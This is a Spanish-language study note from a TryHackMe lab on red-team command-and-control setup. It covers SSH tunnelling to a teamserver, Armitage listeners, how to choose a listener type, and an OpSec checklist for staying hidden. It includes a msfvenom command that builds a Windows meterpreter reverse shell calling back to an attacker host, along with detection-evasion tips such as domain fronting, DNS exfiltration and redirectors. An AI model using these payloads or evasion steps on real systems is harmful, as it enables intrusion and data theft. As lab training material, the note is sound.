---
tags: [red-team, c2, opsec, infrastructure, listeners]
created: 2026-04-19
source: TryHackMe - Intro to C2
related:
  - "[[C2 Framework - Fundamentos]]"
  - "[[C2 Frameworks comunes]]"
  - "[[SSH Port Forwarding]]"
---

# C2 — Acceso y gestión de infraestructura

> [!abstract] TL;DR
> C2 management interface **nunca** expuesto públicamente. SSH port-forward para acceder al teamserver. Listeners: Standard, HTTP(S), DNS, SMB — cada uno con su caso de uso.

## OpSec básico — por qué no exponer el management

C2 servers son **fingerprinteables**:
- CS pre-3.13 → espacio extra (`\x20`) al final de HTTP response → blue teams escaneaban internet entero buscando CS
- Certs default, banners, headers específicos → red flags

> [!warning]
> Reducir superficie: management solo accesible vía SSH tunnel o VPN. Firewall restrictivo (UFW/iptables/Security Groups) permitiendo solo IPs del team.

## SSH port-forwarding para acceso seguro

Teamserver escuchando en `127.0.0.1:55553` del C2. Desde Kali:

```bash
ssh -L 55553:127.0.0.1:55553 root@<C2_IP>
```

Ahora `localhost:55553` en Kali → teamserver remoto.

> [!tip]
> Armitage NO soporta listeners en loopback. Para Armitage específicamente, el teamserver necesita bind en IP pública → firewall obligatorio. Para Covenant/Empire, el loopback + SSH tunnel es el patrón estándar.

## Listener en Armitage — flujo

1. Armitage → Listeners → Reverse
2. Configurar: puerto (ej. 31337) + tipo (Shell | Meterpreter)
3. Se crea como `exploit/multi/handler` de Metasploit

Payload para callback:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=31337 \
  -f exe -o shell.exe
```

Transferís + ejecutás en víctima → callback.

## Tipos de listener

| Tipo | Uso / características |
|---|---|
| **Standard (TCP/UDP)** | Raw socket, **cleartext**. Solo labs o redes internas muy abiertas. |
| **HTTP/HTTPS** | Se disfraza de web server. Compatible con Domain Fronting + Malleable profiles. HTTPS evade NGFW. Default moderno. |
| **DNS** | Útil para **exfil** y bypass de proxies. Requiere infra extra: dominio registrado + NS server público. Lento pero sigiloso. |
| **SMB (named pipes)** | Pivoting en redes restringidas. Un solo host habla con el C2 por HTTP(S), el resto se comunica via SMB con ese pivot. |

## Decisión rápida de listener

```
¿Target tiene internet directo + NGFW?    → HTTPS + C2 profile
¿Red segmentada, solo un host sale?       → SMB pivot
¿Proxy corporativo agresivo bloquea todo? → DNS
¿Lab interno sin defensas?                → Standard (no en engagements reales)
```

## Checklist OpSec mínimo para C2

- [ ] Management interface en loopback o detrás de SSH
- [ ] Firewall restringiendo acceso al teamserver por IP
- [ ] Certs válidos (Let's Encrypt) en listeners públicos
- [ ] Malleable profile custom (no default)
- [ ] Redirector delante del C2 real
- [ ] Dominio aged con categoría legítima